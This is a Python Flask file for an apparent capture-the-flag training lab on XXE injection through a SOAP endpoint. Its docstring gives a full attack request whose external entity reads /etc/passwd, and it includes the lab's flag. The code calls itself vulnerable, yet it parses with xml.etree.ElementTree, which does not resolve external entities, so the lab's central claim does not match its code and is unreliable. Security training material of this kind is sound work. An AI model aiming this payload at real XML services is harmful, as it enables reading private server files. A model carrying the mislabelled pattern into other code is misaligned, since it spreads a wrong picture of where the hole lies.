"""
XXE Lab 10: SOAP XXE Injection
Difficulty: 3 (Advanced)
Points: 100

Description:
XXE in SOAP/WebService XML.
"""

from flask import Flask, request
import xml.etree.ElementTree as ET

app = Flask(__name__)

@app.route('/soap', methods=['POST'])
def soap():
    """
    VULNERABLE: SOAP endpoint with XXE
    
    Attack Vector:
    POST /soap
    Content-Type: text/xml
    
    <?xml version="1.0"?>
    <!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
            <getUser>
                <id>&xxe;</id>
            </getUser>
        </soap:Body>
    </soap:Envelope>
    
    Flag: FLAG{xxe_soap_010}
    """
    try:
        root = ET.fromstring(request.data)
        return ET.tostring(root, encoding='unicode')
    except Exception as e:
        return str(e), 400

@app.route('/')
def index():
    return """
    <html>
    <body>
        <h1>SOAP XXE Lab</h1>
        <p>POST SOAP envelope with XXE payload to /soap endpoint</p>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5010, debug=False)
